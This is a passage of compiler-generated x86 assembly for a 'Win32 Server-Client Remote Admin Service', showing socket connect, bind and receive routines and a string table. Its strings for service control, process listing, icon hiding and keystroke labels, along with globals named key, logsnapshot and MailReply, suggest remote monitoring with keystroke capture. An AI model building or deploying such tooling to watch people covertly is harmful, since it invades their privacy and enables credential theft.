#undef p2pCreateBindSocket.port
#endif
#define p2pCreateBindSocket.port ebp+12	; exposes function argument 'port'
;
;
#ifdef p2pCreateBindSocket.socket
#undef p2pCreateBindSocket.socket
#endif
#define p2pCreateBindSocket.socket ebp+16	; exposes function argument 'socket'
;
align 16
_p2pCreateBindSocket.server@12:
;  *****
;  *****  FUNCTION  p2pCreateBindSocket ()  *****
;  *****
func7A.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,188			;;; i114a
;
funcBody7A.server:
;
; [3499] 'SHARED EXITSTATUS
;
; [3502] IFZ addy$ THEN RETURN $$FALSE
	mov	eax,[ebp+8]			;;; i665
	test	eax,eax			;;; i188
	jz	> A.537			;;; i189
	mov	eax,d[eax-8]			;;; i190
	test	eax,eax			;;; i191
	jnz	>> else.015A.server			;;; i192
A.537:
	mov	eax,0			;;; i659
	jmp	end.func7A.server			;;; i258
else.015A.server:
end.if.015A.server:
;
; [3503] socket = socket ($$AF_INET, $$SOCK_STREAM, 0)
;
; [0] EXTERNAL SFUNCTION  socket           (domain, type, protocol)
	push	0			;;; i656a
	push	1			;;; i656a
	push	2			;;; i656a
	call	_socket@12			;;; i619
	mov	d[ebp+16],eax			;;; i670
;
; [3504] IF (socket == $$SOCKET_ERROR) THEN RETURN $$FALSE
	mov	eax,d[ebp+16]			;;; i665
	cmp	eax,-1			;;; i684a
	jne	>> else.015B.server			;;; i219
	mov	eax,0			;;; i659
	jmp	end.func7A.server			;;; i258
else.015B.server:
end.if.015B.server:
;
; [3506] ret = $$FALSE
#ifdef p2pCreateBindSocket.ret
#undef p2pCreateBindSocket.ret
#endif
#define p2pCreateBindSocket.ret ebp-40	; exposes local variable 'ret'
;
	mov	eax,0			;;; i659
	mov	d[ebp-40],eax			;;; i670
;
; [3507] ct = 0
#ifdef p2pCreateBindSocket.ct
#undef p2pCreateBindSocket.ct
#endif
#define p2pCreateBindSocket.ct ebp-44	; exposes local variable 'ct'
;
	mov	eax,0			;;; i659
	mov	d[ebp-44],eax			;;; i670
;
; [3508] DO
align 8
do.015C.server:
;
; [3509] ret = p2pBind (socket,addy$,port)
	mov	eax,d[ebp+8]			;;; i665
	call	%_clone.a0			;;; i634
; .xstk7A.0000 = ebp-52	; internal variable
	mov	d[ebp-52],eax			;;; i670
	push	[ebp+12]			;;; i674a
	push	[ebp-52]			;;; i674a
	push	[ebp+16]			;;; i674a
	call	func7D.server			;;; i619
	sub	esp,12			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,12			;;; i633
	mov	d[ebp-40],eax			;;; i670
;
; [3510] IFF ret THEN
	mov	eax,d[ebp-40]			;;; i665
	test	eax,eax			;;; i194
	jnz	>> else.015D.server			;;; i195
;
; [3511] Sleep(100)
	push	100			;;; i656a
	call	_Sleep@4			;;; i619
;
; [3512] INC ct
	inc	d[ebp-44]			;;; i84
;
; [3513] IF ct == 10 THEN RETURN $$FALSE
	mov	eax,d[ebp-44]			;;; i665
	cmp	eax,10			;;; i684a
	jne	>> else.015E.server			;;; i219
	mov	eax,0			;;; i659
	jmp	end.func7A.server			;;; i258
else.015E.server:
end.if.015E.server:
;
; [3514] END IF
else.015D.server:
end.if.015D.server:
;
; [3515] LOOP WHILE (ret == $$FALSE)'&& (EXITSTATUS == $$FALSE))
do.loop.015C.server:
	mov	eax,d[ebp-40]			;;; i665
	cmp	eax,0			;;; i684a
	je	< do.015C.server			;;; i193
end.do.015C.server:
;
; [3517] RETURN $$TRUE
	mov	eax,-1			;;; i659
	jmp	end.func7A.server			;;; i258
;
; [3518] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.p2pCreateBindSocket.server:  ;;; Function end label for Assembly Programmers.
end.func7A.server:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	12			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  p2pCreateBindSocket ()  *****
;  *****
;
; [3520] FUNCTION p2pConnect (ipaddress$,port,socket)
.code
;
#ifdef p2pConnect.ipaddress$
#undef p2pConnect.ipaddress$
#endif
#define p2pConnect.ipaddress$ ebp+8	; exposes function argument 'ipaddress$'
;
;
#ifdef p2pConnect.port
#undef p2pConnect.port
#endif
#define p2pConnect.port ebp+12	; exposes function argument 'port'
;
;
#ifdef p2pConnect.socket
#undef p2pConnect.socket
#endif
#define p2pConnect.socket ebp+16	; exposes function argument 'socket'
;
align 16
_p2pConnect.server@12:
;  *****
;  *****  FUNCTION  p2pConnect ()  *****
;  *****
func7E.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func7E.server
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,2				;;; ..
	xor	eax,eax			;;; ...
A.543:
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.543			;;; .....
	push	eax				;;; ......
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,184			;;; i114a
;
;	#### Begin Composite Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Composite Initialization Code ####
;
	lea	eax,[esp]			;;; i125
	mov	d[ebp-44],eax			;;; i670
funcBody7E.server:
;
; [3521] SOCKADDR_IN udtSocket
; .composites = ebp-40	; internal variable
#ifdef p2pConnect.udtSocket
#undef p2pConnect.udtSocket
#endif
#define p2pConnect.udtSocket ebp-44	; exposes local variable 'udtSocket'
;
;
; [3524] udtSocket.sin_family = $$AF_INET
	mov	eax,d[ebp-44]			;;; i665
	mov	ebx,2			;;; i659
	mov	w[eax],bx			;;; i13b
;
; [3525] udtSocket.sin_port = htons (port)
	push	[ebp+12]			;;; i674a
	call	_htons@4			;;; i619
	mov	ebx,d[ebp-44]			;;; i665
	mov	w[ebx+2],ax			;;; i13b
;
; [3526] udtSocket.sin_addr = inet_addr (&ipaddress$)
	mov	eax,d[ebp+8]			;;; i642
	push	eax			;;; i667a
	call	_inet_addr@4			;;; i619
	mov	ebx,d[ebp-44]			;;; i665
	mov	d[ebx+4],eax			;;; i13b
;
; [3528] IF udtSocket.sin_addr = $$INADDR_NONE THEN
	mov	eax,d[ebp-44]			;;; i665
	mov	eax,d[eax+4]			;;; i313b
	cmp	eax,-1			;;; i684a
	jne	>> else.015F.server			;;; i219
;
; [3529] GetIPAddr (ipaddress$, @numIPAddr$)
	mov	eax,d[ebp+8]			;;; i665
	call	%_clone.a0			;;; i634
; .xstk7E.0000 = ebp-52	; internal variable
	mov	d[ebp-52],eax			;;; i670
#ifdef p2pConnect.numIPAddr$
#undef p2pConnect.numIPAddr$
#endif
#define p2pConnect.numIPAddr$ ebp-56	; exposes local variable 'numIPAddr$'
;
	push	[ebp-56]			;;; i674a
	push	[ebp-52]			;;; i674a
	call	func7F.server			;;; i619
	sub	esp,8			;;; xnt1i
	mov	esi,d[esp]			;;; i871
	call	%____free			;;; i872
	mov	ecx,d[esp+4]			;;; i877a
	mov	[ebp-56],ecx			;;; i670
	add	esp,8			;;; i633
;
; [3530] udtSocket.sin_addr = inet_addr (&numIPAddr$)
	mov	eax,d[ebp-56]			;;; i642
	push	eax			;;; i667a
	call	_inet_addr@4			;;; i619
	mov	ebx,d[ebp-44]			;;; i665
	mov	d[ebx+4],eax			;;; i13b
;
; [3531] END IF
else.015F.server:
end.if.015F.server:
;
; [3533] socket = socket (udtSocket.sin_family, $$SOCK_STREAM, 0)
	mov	eax,d[ebp-44]			;;; i665
	movsx	eax,w[eax]			;;; i313b
	mov	d[ebp-52],eax			;;; i670
	push	0			;;; i656a
	push	1			;;; i656a
	push	[ebp-52]			;;; i674a
	call	_socket@12			;;; i619
	mov	d[ebp+16],eax			;;; i670
;
; [3534] IF (connect (socket, &udtSocket, SIZE(udtSocket)) == $$SOCKET_ERROR) THEN
;
; [0] EXTERNAL SFUNCTION  connect          (socket, addrSOCKADDR, length)
	mov	eax,d[ebp-44]			;;; i642
	mov	d[ebp-52],eax			;;; i670
	mov	eax,16			;;; i584
	push	eax			;;; i667a
	push	[ebp-52]			;;; i674a
	push	[ebp+16]			;;; i674a
	call	_connect@12			;;; i619
	cmp	eax,-1			;;; i684a
	jne	>> else.0160.server			;;; i219
;
; [3535] 'CPrint ("* wsa error "+ STRING$(WSAGetLastError ()))
;
; [3536] IF socket THEN p2pCloseSocket (socket)
	mov	eax,d[ebp+16]			;;; i665
	test	eax,eax			;;; i220
	jz	>> else.0161.server			;;; i221
	push	[ebp+16]			;;; i674a
	call	func7B.server			;;; i619
else.0161.server:
end.if.0161.server:
;
; [3537] RETURN $$FALSE
	mov	eax,0			;;; i659
	jmp	end.func7E.server			;;; i258
;
; [3538] ELSE
	jmp	end.if.0160.server			;;; i107
else.0160.server:
;
; [3539] RETURN $$TRUE
	mov	eax,-1			;;; i659
	jmp	end.func7E.server			;;; i258
;
; [3540] END IF
end.if.0160.server:
;
; [3542] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.p2pConnect.server:  ;;; Function end label for Assembly Programmers.
end.func7E.server:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func7E.server
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	12			;;; i111a
free.func7E.server:
	mov	esi,[ebp-56]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  p2pConnect ()  *****
;  *****
;
; [3544] FUNCTION p2pListenBin (socket,size,lpbuffer)
.code
;
#ifdef p2pListenBin.socket
#undef p2pListenBin.socket
#endif
#define p2pListenBin.socket ebp+8	; exposes function argument 'socket'
;
;
#ifdef p2pListenBin.size
#undef p2pListenBin.size
#endif
#define p2pListenBin.size ebp+12	; exposes function argument 'size'
;
;
#ifdef p2pListenBin.lpbuffer
#undef p2pListenBin.lpbuffer
#endif
#define p2pListenBin.lpbuffer ebp+16	; exposes function argument 'lpbuffer'
;
align 16
_p2pListenBin.server@12:
;  *****
;  *****  FUNCTION  p2pListenBin ()  *****
;  *****
func79.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,196			;;; i114a
;
funcBody79.server:
;
; [3545] ULONG total
#ifdef p2pListenBin.total
#undef p2pListenBin.total
#endif
#define p2pListenBin.total ebp-40	; exposes local variable 'total'
;
;
; [3548] IF !lpbuffer || !size THEN RETURN $$FALSE
	mov	eax,d[ebp+16]			;;; i665
	neg	eax			;;; i888
	cmc				;;; i889
	rcr	eax,1			;;; i890
	sar	eax,31			;;; i891
	mov	ebx,d[ebp+12]			;;; i665
	neg	ebx			;;; i888
	cmc				;;; i889
	rcr	ebx,1			;;; i890
	sar	ebx,31			;;; i891
	or	eax,ebx			;;; i732
	neg	eax			;;; i736
	rcr	eax,1			;;; i737
	sar	eax,31			;;; i738
	test	eax,eax			;;; i220
	jz	>> else.0162.server			;;; i221
	mov	eax,0			;;; i659
	jmp	end.func79.server			;;; i258
else.0162.server:
end.if.0162.server:
;
; [3549] total = size
	mov	eax,d[ebp+12]			;;; i665
	mov	d[ebp-40],eax			;;; i670
;
; [3551] DO
align 8
do.0163.server:
;
; [3552] bytesRecv = recv (socket, lpbuffer, total, 0)
#ifdef p2pListenBin.bytesRecv
#undef p2pListenBin.bytesRecv
#endif
#define p2pListenBin.bytesRecv ebp-44	; exposes local variable 'bytesRecv'
;
	push	0			;;; i656a
	push	[ebp-40]			;;; i674a
	push	[ebp+16]			;;; i674a
	push	[ebp+8]			;;; i674a
	call	_recv@16			;;; i619
	mov	d[ebp-44],eax			;;; i670
;
; [3553] IF (bytesRecv == $$SOCKET_ERROR) THEN RETURN $$FALSE
	mov	eax,d[ebp-44]			;;; i665
	cmp	eax,-1			;;; i684a
	jne	>> else.0164.server			;;; i219
	mov	eax,0			;;; i659
	jmp	end.func79.server			;;; i258
else.0164.server:
end.if.0164.server:
;
; [3554] IF (bytesRecv == 0) THEN EXIT DO
	mov	eax,d[ebp-44]			;;; i665
	cmp	eax,0			;;; i684a
	jne	>> else.0165.server			;;; i219
	jmp	end.do.0163.server			;;; i144
else.0165.server:
end.if.0165.server:
;
; [3556] total = total - bytesRecv
	mov	eax,d[ebp-40]			;;; i665
	mov	ebx,d[ebp-44]			;;; i665
	sub	eax,ebx			;;; i791
	mov	d[ebp-40],eax			;;; i670
;
; [3557] lpbuffer = lpbuffer + bytesRecv
	mov	eax,d[ebp+16]			;;; i665
	mov	ebx,d[ebp-44]			;;; i665
	add	eax,ebx			;;; i775
	mov	d[ebp+16],eax			;;; i670
;
; [3558] LOOP WHILE (total > 0)
do.loop.0163.server:
	mov	eax,d[ebp-40]			;;; i665
	mov	ebx,0			;;; i659
	or	ebx,ebx			;;; i366
	jns	> A.545			;;; i367
	call	%_eeeOverflow			;;; i368
A.545:
	cmp	eax,ebx			;;; i684a
	ja	< do.0163.server			;;; i193
end.do.0163.server:
;
; [3559] size = total
	mov	eax,d[ebp-40]			;;; i665
	mov	d[ebp+12],eax			;;; i670
;
; [3561] RETURN $$TRUE
	mov	eax,-1			;;; i659
	jmp	end.func79.server			;;; i258
;
; [3562] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.p2pListenBin.server:  ;;; Function end label for Assembly Programmers.
end.func79.server:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	12			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  p2pListenBin ()  *****
;  *****
;
; [3564] FUNCTION  MAKELONG (lo, hi)
.code
;
#ifdef MAKELONG.lo
#undef MAKELONG.lo
#endif
#define MAKELONG.lo ebp+8	; exposes function argument 'lo'
;
;
#ifdef MAKELONG.hi
#undef MAKELONG.hi
#endif
#define MAKELONG.hi ebp+12	; exposes function argument 'hi'
;
align 16
_MAKELONG@8:
;  *****
;  *****  FUNCTION  MAKELONG ()  *****
;  *****
func2.server:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
	sub	esp,220			;;; i114a
;
funcBody2.server:
;
; [3566] RETURN lo | (hi << 16)
	mov	eax,d[ebp+12]			;;; i665
	shl	eax,16			;;; i835
	mov	ebx,d[ebp+8]			;;; i665
	or	eax,ebx			;;; i763
	jmp	end.func2.server			;;; i258
;
; [3568] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.MAKELONG.server:  ;;; Function end label for Assembly Programmers.
end.func2.server:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	8			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  MAKELONG ()  *****
;  *****
;
; [3570] END PROGRAM
;<peep
end_program.server:
	push	ebp			;;; i128
	mov	ebp,esp			;;; i129
	sub	esp,128			;;; i130
	mov	esi,[%#cip$.server]			;;; i663a
	call	%____free			;;; i423
	mov	esi,[%#IPAddr$.server]			;;; i663a
	call	%____free			;;; i423
	mov	esi,[%3%message$.server]			;;; i663a
	call	%____free			;;; i423
	mov	esi,[%#startDate$.server]			;;; i663a
	call	%____free			;;; i423
	mov	esi,[%#startTime$.server]			;;; i663a
	call	%____free			;;; i423
	mov	esi,[%5%scmd$.server]			;;; i663a
	call	%____free			;;; i423
	mov	esi,[%5%cmd$.server]			;;; i663a
	call	%____free			;;; i423
	mov	esi,d[%%6%%QMsg.server]			;;; i663a
	call	%_FreeArray			;;; i424
	mov	esi,[%B%str$.server]			;;; i663a
	call	%____free			;;; i423
	mov	esi,[%MailReply.server]			;;; i663a
	call	%____free			;;; i423
	mov	esi,[%atitle.server]			;;; i663a
	call	%____free			;;; i423
	mov	esi,d[%%36%%p2p.server]			;;; i663a
	call	%_FreeArray			;;; i424
	mov	esi,[%membuffer.server]			;;; i663a
	call	%____free			;;; i423
	mov	esi,[%neweventslog.server]			;;; i663a
	call	%____free			;;; i423
	mov	esi,[%55%logheader.server]			;;; i663a
	call	%____free			;;; i423
	mov	esi,[%56%logsnapshot.server]			;;; i663a
	call	%____free			;;; i423
	mov	esi,[%57%key.server]			;;; i663a
	call	%____free			;;; i423
	mov	esi,[%eventlog.server]			;;; i663a
	call	%____free			;;; i423
	mov	esi,d[%%%setargv$.server]			;;; i663a
	call	%_FreeArray			;;; i424
	call	_XxxTerminate@0
	mov	esp,ebp			;;; i132
	pop	ebp			;;; i133
	ret				;;; i134
;
InitSharedComposites.server:
	push	ebp			;;; i135
	mov	ebp,esp			;;; i136
	sub	esp,128			;;; i137
	mov	esi,20236			;;; i138
	call	%____calloc			;;; i139a
	mov	eax,esi			;;; i139b
	mov	d[%.composites.server],eax			;;; i668
	lea	eax,[esi]			;;; i140
	lea	ebx,[esi+28]			;;; i140a
	lea	ecx,[esi+56]			;;; i140b
	lea	edx,[esi+84]			;;; i140c
	lea	edi,[esi+112]			;;; i140d
	mov	d[%ssStatus.server],eax			;;; i668
	mov	d[%ssStatus.server],ebx			;;; i668
	mov	d[%ssStatus.server],ecx			;;; i668
	mov	d[%ssStatus.server],edx			;;; i668
	mov	d[%3C%pFileOp.server],edi			;;; i668
	lea	eax,[esi+144]			;;; i140
	lea	ebx,[esi+20212]			;;; i140a
	mov	d[%44%jcprops.server],eax			;;; i668
	mov	d[%43%bmp.server],ebx			;;; i668
	mov	esp,ebp			;;; i141
	pop	ebp			;;; i142
	ret				;;; i143
;
.code
; ########################
; #####  WinMain ()  #####
; ########################
align 8
_main:												; C entry label
_WinMain:											; Windows entry label
_WinMain@16:									; Windows entry label
	push ebp
	mov ebp,esp
	push addr %_StartApplication
	call _Xit@4
	call _XxxTerminate@0
	mov esp,ebp
	pop ebp
	ret
;
;;;  *****  DEFINE '.bss' SECTION LIMITS  *****
;
align 8
data section 'server$aaaaa'
%_begin_external_data_server dd ?
;
align 8
data section 'server$zzzzz'
%_end_external_data_server dd ?
;
;
;;;  *****  DEFINE LITERAL STRINGS  *****
.const
align 8
;
dd 24, 0, 6, 0x80130001
@_string.0029.server:
db	"server"
db	2 dup 0
;
dd 24, 0, 3, 0x80130001
@_string.002A.server:
db	"0.7"
db	5 dup 0
;
dd 24, 0, 3, 0x80130001
@_string.002B.server:
db	"xst"
db	5 dup 0
;
dd 24, 0, 5, 0x80130001
@_string.002C.server:
db	"xio_s"
db	3 dup 0
;
dd 24, 0, 7, 0x80130001
@_string.002D.server:
db	"wsock32"
db	1 dup 0
;
dd 32, 0, 8, 0x80130001
@_string.002E.server:
db	"kernel32"
db	8 dup 0
;
dd 24, 0, 5, 0x80130001
@_string.002F.server:
db	"gdi32"
db	3 dup 0
;
dd 32, 0, 8, 0x80130001
@_string.0030.server:
db	"advapi32"
db	8 dup 0
;
dd 24, 0, 6, 0x80130001
@_string.0031.server:
db	"msvcrt"
db	2 dup 0
;
dd 24, 0, 5, 0x80130001
@_string.0032.server:
db	"psapi"
db	3 dup 0
;
dd 24, 0, 6, 0x80130001
@_string.0033.server:
db	"fs.obj"
db	2 dup 0
;
dd 32, 0, 10, 0x80130001
@_string.0034.server:
db	"ijl15d.dec"
db	6 dup 0
;
dd 24, 0, 7, 0x80130001
@_string.0035.server:
db	"net.dec"
db	1 dup 0
;
dd 32, 0, 12, 0x80130001
@_string.0036.server:
db	"p2pfiled.dec"
db	4 dup 0
;
dd 24, 0, 6, 0x80130001
@_string.0037.server:
db	"user32"
db	2 dup 0
;
dd 24, 0, 7, 0x80130001
@_string.0038.server:
db	"shell32"
db	1 dup 0
;
dd 32, 0, 8, 0x80130001
@_string.0039.server:
db	"comctl32"
db	8 dup 0
;
dd 32, 0, 8, 0x80130001
@_string.0075.server:
db	"TService"
db	8 dup 0
;
dd 40, 0, 19, 0x80130001
@_string.0077.server:
db	"Win32 Server-Client"
db	5 dup 0
;
dd 64, 0, 40, 0x80130001
@_string.0079.server:
db	"Win32 Server-Client Remote Admin Service"
db	8 dup 0
;
dd 32, 0, 8, 0x80130001
@_string.00F4.server:
db	"-install"
db	8 dup 0
;
dd 24, 0, 7, 0x80130001
@_string.00F5.server:
db	"-remove"
db	1 dup 0
;
dd 32, 0, 8, 0x80130001
@_string.00F6.server:
db	"-refresh"
db	8 dup 0
;
dd 24, 0, 5, 0x80130001
@_string.00F7.server:
db	"-stop"
db	3 dup 0
;
dd 32, 0, 13, 0x80130001
@_string.00F8.server:
db	"net.exe stop "
db	3 dup 0
;
dd 24, 0, 6, 0x80130001
@_string.00F9.server:
db	"-start"
db	2 dup 0
;
dd 32, 0, 14, 0x80130001
@_string.00FA.server:
db	"net.exe start "
db	2 dup 0
;
dd 24, 0, 6, 0x80130001
@_string.00FB.server:
db	"-debug"
db	2 dup 0
;
dd 32, 0, 8, 0x80130001
@_string.0100.server:
db	" -remove"
db	8 dup 0
;
dd 32, 0, 9, 0x80130001
@_string.0102.server:
db	" -install"
db	7 dup 0
;
dd 32, 0, 12, 0x80130001
@_string.0114.server:
db	"kernel32.dll"
db	4 dup 0
;
dd 32, 0, 9, 0x80130001
@_string.0116.server:
db	"psapi.dll"
db	7 dup 0
;
dd 48, 0, 24, 0x80130001
@_string.0118.server:
db	"CreateToolhelp32Snapshot"
db	8 dup 0
;
dd 32, 0, 13, 0x80130001
@_string.0119.server:
db	"Process32Next"
db	3 dup 0
;
dd 24, 0, 1, 0x80130001
@_string.011F.server:
db	0x09
db	7 dup 0
;
dd 24, 0, 1, 0x80130001
@_string.0121.server:
db	":"
db	7 dup 0
;
dd 24, 0, 3, 0x80130001
@_string.0122.server:
db	0x01,0x02,":"
db	5 dup 0
;
dd 24, 0, 2, 0x80130001
@_string.0123.server:
db	0x01,0x02
db	6 dup 0
;
dd 32, 0, 10, 0x80130001
@_string.0124.server:
db	" processes"
db	6 dup 0
;
dd 48, 0, 31, 0x80130001
@_string.0125.server:
db	":unable to acquire process list"
db	1 dup 0
;
dd 32, 0, 12, 0x80130001
@_string.0163.server:
db	"advapi32.dll"
db	4 dup 0
;
dd 40, 0, 21, 0x80130001
@_string.0164.server:
db	"ChangeServiceConfig2A"
db	3 dup 0
;
dd 32, 0, 11, 0x80130001
@_string.0184.server:
db	"IDI_STANDBY"
db	5 dup 0
;
dd 48, 0, 31, 0x80130001
@_string.0186.server:
db	"Right click then 'Stop' to Exit"
db	1 dup 0
;
dd 32, 0, 14, 0x80130001
@_string.0192.server:
db	"TaskbarCreated"
db	2 dup 0
;
dd 32, 0, 13, 0x80130001
@_string.0195.server:
db	"Show &Console"
db	3 dup 0
;
dd 32, 0, 13, 0x80130001
@_string.0196.server:
db	"S&tart Server"
db	3 dup 0
;
dd 32, 0, 12, 0x80130001
@_string.0197.server:
db	"S&top Server"
db	4 dup 0
;
dd 32, 0, 10, 0x80130001
@_string.0199.server:
db	"Hide &Icon"
db	6 dup 0
;
dd 32, 0, 13, 0x80130001
@_string.019A.server:
db	"&Stop Service"
db	3 dup 0
;
dd 32, 0, 15, 0x80130001
@_string.019B.server:
db	"&Remove Service"
db	1 dup 0
;
dd 32, 0, 15, 0x80130001
@_string.01AD.server:
db	"Install Service"
db	1 dup 0
;
dd 32, 0, 14, 0x80130001
@_string.01AE.server:
db	"Remove Service"
db	2 dup 0
;
dd 32, 0, 11, 0x80130001
@_string.01AF.server:
db	"Stop Server"
db	5 dup 0
;
dd 32, 0, 12, 0x80130001
@_string.01B0.server:
db	"Show Console"
db	4 dup 0
;
dd 32, 0, 12, 0x80130001
@_string.01B2.server:
db	"Hide Console"
db	4 dup 0
;
dd 24, 0, 3, 0x80130001
@_string.01C3.server:
db	"127"
db	5 dup 0
;
dd 24, 0, 5, 0x80130001
@_string.01C6.server:
db	"AUTH "
db	3 dup 0
;
dd 48, 0, 30, 0x80130001
@_string.01CC.server:
db	"CMSG ",0x01,0x02,"*** BYE ***",0x0D,0x0A,"DISCONNECT"
db	2 dup 0
;
dd 32, 0, 10, 0x80130001
@_string.0207.server:
db	0x0D,0x0A,0x0D,0x0A,"##### "
db	6 dup 0
;
dd 24, 0, 4, 0x80130001
@_string.0208.server:
db	" -- "
db	4 dup 0
;
dd 32, 0, 8, 0x80130001
@_string.0209.server:
db	" #####",0x0D,0x0A
db	8 dup 0
;
dd 32, 0, 10, 0x80130001
@_string.0216.server:
db	"[L BUTTON]"
db	6 dup 0
;
dd 32, 0, 10, 0x80130001
@_string.0218.server:
db	"[R BUTTON]"
db	6 dup 0
;
dd 32, 0, 8, 0x80130001
@_string.021A.server:
db	"[CANCEL]"
db	8 dup 0
;
dd 32, 0, 10, 0x80130001
@_string.021C.server:
db	"[M BUTTON]"
db	6 dup 0
;
dd 24, 0, 6, 0x80130001
@_string.021E.server:
db	"[BACK]"
db	2 dup 0
;
dd 24, 0, 5, 0x80130001
@_string.0220.server:
db	"[TAB]"
db	3 dup 0
;
dd 24, 0, 7, 0x80130001
@_string.0222.server:
db	"[CLEAR]"
db	1 dup 0
;
dd 32, 0, 10, 0x80130001
@_string.0224.server:
db	"[RETURN]",0x01,0x02
db	6 dup 0
;
dd 24, 0, 6, 0x80130001
@_string.0225.server:
db	"[KANA]"
db	2 dup 0
;
dd 24, 0, 7, 0x80130001
@_string.022A.server:
db	"[PAUSE]"
db	1 dup 0
;
dd 32, 0, 13, 0x80130001
@_string.022B.server:
db	"[CAPSLOCK ON]"
db	3 dup 0
;
dd 32, 0, 14, 0x80130001
@_string.022C.server:
db	"[CAPSLOCK OFF]"
db	2 dup 0
;
dd 32, 0, 8, 0x80130001
@_string.022E.server:
db	"[ESCAPE]"
db	8 dup 0
;
dd 24, 0, 1, 0x80130001
@_string.0230.server:
db	" "
db	7 dup 0
;
dd 24, 0, 6, 0x80130001
@_string.0232.server:
db	"[PGUP]"
db	2 dup 0
;
dd 24, 0, 6, 0x80130001
@_string.0234.server:
db	"[PGDN]"
db	2 dup 0
;
dd 24, 0, 5, 0x80130001
@_string.0236.server:
db	"[END]"
db	3 dup 0
;
dd 24, 0, 6, 0x80130001
@_string.0238.server:
db	"[HOME]"
db	2 dup 0
;
dd 24, 0, 6, 0x80130001
@_string.023A.server:
db	"[LEFT]"
db	2 dup 0
;
dd 24, 0, 4, 0x80130001
@_string.023C.server:
db	"[UP]"
db	4 dup 0
;
dd 24, 0, 7, 0x80130001
@_string.023E.server:
db	"[RIGHT]"
db	1 dup 0
;
dd 24, 0, 6, 0x80130001
@_string.0240.server:
db	"[DOWN]"
db	2 dup 0
;
dd 32, 0, 8, 0x80130001
@_string.0242.server:
db	"[SELECT]"
db	8 dup 0
;
dd 24, 0, 7, 0x80130001
@_string.0244.server:
db	"[PRINT]"
db	1 dup 0
;
dd 32, 0, 9, 0x80130001
@_string.0246.server:
db	"[EXECUTE]"
db	7 dup 0
;
dd 32, 0, 10, 0x80130001
@_string.0248.server:
db	"[SNAPSHOT]"
db	6 dup 0
;
dd 32, 0, 8, 0x80130001
@_string.024A.server:
db	"[INSERT]"
db	8 dup 0
;
dd 32, 0, 8, 0x80130001
@_string.024C.server:
db	"[DELETE]"
db	8 dup 0
;
dd 24, 0, 6, 0x80130001
@_string.024E.server:
db	"[HELP]"
db	2 dup 0
;
dd 32, 0, 10, 0x80130001
@_string.0250.server:
db	"[NUMPAD 0]"
db	6 dup 0
;
dd 32, 0, 10, 0x80130001
@_string.0252.server:
db	"[NUMPAD 1]"
db	6 dup 0
;
dd 32, 0, 10, 0x80130001
@_string.0254.server:
db	"[NUMPAD 2]"
